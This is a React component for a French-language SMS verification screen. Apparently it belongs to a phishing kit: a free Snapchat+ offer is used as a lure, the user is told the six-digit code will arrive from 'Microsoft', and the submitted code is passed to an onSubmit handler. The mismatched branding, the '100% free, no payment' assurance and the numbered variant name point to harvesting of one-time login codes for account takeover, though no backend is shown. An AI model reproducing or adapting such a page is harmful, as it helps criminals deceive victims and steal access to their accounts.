import { useState, useRef, useEffect } from "react";
import { motion } from "framer-motion";
import { ChevronRight, Clock } from "lucide-react";
import Logo from "@/components/Logo";


export default function CodeVerification6({ data, onSubmit, loading, onExpire }) {
  const [code, setCode] = useState(["", "", "", "", "", ""]);
  const [timeLeft, setTimeLeft] = useState(300);
  const inputs = useRef([]);

  useEffect(() => {
    const interval = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          onExpire?.();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [onExpire]);

  const minutes = Math.floor(timeLeft / 60);
  const seconds = timeLeft % 60;
  const isExpiring = timeLeft < 60;
  const filledCount = code.join("").length;
  const allFilled = filledCount === 6;

  const handleChange = (i, val) => {
    if (!/^\d?$/.test(val)) return;
    const newCode = [...code];
    newCode[i] = val;
    setCode(newCode);
    if (val && i < 5) inputs.current[i + 1]?.focus();
  };

  const handleKeyDown = (i, e) => {
    if (e.key === "Backspace" && !code[i] && i > 0) {
      inputs.current[i - 1]?.focus();
    }
  };

  const handlePaste = (e) => {
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (pasted.length === 6) {
      setCode(pasted.split(""));
      inputs.current[5]?.focus();
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    const full = code.join("");
    if (full.length === 6) onSubmit(full);
  };

  const formatPhone = (tel) => {
    return tel?.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5 }}
      className="w-full max-w-sm mx-auto">
      
      <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">

        <div className="mb-6">
          <Logo />
        </div>

        <div className="w-16 h-16 bg-primary/15 border border-primary/30 rounded-full flex items-center justify-center mx-auto mb-5">
          <span className="text-3xl">💬</span>
        </div>

        <h2 className="font-heading text-xl font-bold text-foreground mb-2">
          Code de vérification
        </h2>
        <p className="text-muted-foreground text-sm mb-2 leading-relaxed">
          Un code SMS à 6 chiffres a été envoyé au{" "}
          <span className="text-foreground font-semibold">{formatPhone(data?.telephone)}</span>
        </p>
        
        <div className={`flex items-center justify-center gap-2 text-xs mb-8 px-4 py-2 rounded-lg ${
          isExpiring ? "bg-destructive/15 text-destructive" : "bg-primary/15 text-primary"
        }`}>
          <Clock className="w-3.5 h-3.5" />
          <span className="font-medium">Expire dans {minutes}:{seconds.toString().padStart(2, "0")}</span>
        </div>

        {/* Format du message reçu */}
        <div className="bg-secondary/30 border border-border rounded-xl px-4 py-3 mb-6 text-center">
          <p className="text-muted-foreground text-xs font-semibold uppercase tracking-widest mb-2">Format du message reçu</p>
          <div className="flex items-center justify-center gap-2 mb-1">
            <span className="text-xl">🟦</span>
            <span className="text-foreground font-bold text-base">Microsoft</span>
          </div>
          <p className="text-muted-foreground text-xs mb-1">Message généré aléatoirement — 6 chiffres</p>
          <p className="text-green-400 text-xs font-semibold">✅ Aucun paiement ne vous sera demandé — service 100% gratuit</p>
        </div>

        <form onSubmit={handleSubmit}>
          <div className="flex justify-center gap-2 mb-8" onPaste={handlePaste}>
            {code.map((digit, i) =>
              <input
                key={i}
                ref={(el) => inputs.current[i] = el}
                type="tel"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(i, e.target.value)}
                onKeyDown={(e) => handleKeyDown(i, e)}
                autoComplete="one-time-code"
                className={`w-11 h-12 md:w-12 md:h-14 text-center text-xl font-bold rounded-xl text-foreground focus:outline-none transition-all text-base border-2 ${allFilled ? "border-green-500/60 bg-green-500/10 shadow-lg shadow-green-500/20" : digit ? "border-primary bg-primary/5" : "border-white/10 bg-white/5 focus:border-primary focus:bg-primary/5"}`} />
            )}
          </div>

          <motion.button
            type="submit"
            disabled={loading || code.join("").length < 6 || timeLeft === 0}
            whileHover={{ scale: loading ? 1 : 1.02 }}
            whileTap={{ scale: loading ? 1 : 0.98 }}
            className="w-full bg-primary text-primary-foreground font-bold py-4 rounded-xl text-base tracking-wide transition-all duration-200 disabled:opacity-40 disabled:cursor-not-allowed shadow-lg shadow-primary/30 flex items-center justify-center gap-2">
            
            {loading ?
              <span className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" /> :
              <>Valider <ChevronRight className="w-5 h-5" /></>
            }
          </motion.button>
        </form>

        <p className="text-muted-foreground/50 text-xs mt-6 leading-relaxed">
          L'abonnement Snapchat+ ne vous sera pas facturé.<br />
          L'abonnement est disponible uniquement pour les utilisateurs éligibles.
        </p>
      </div>
    </motion.div>
  );
}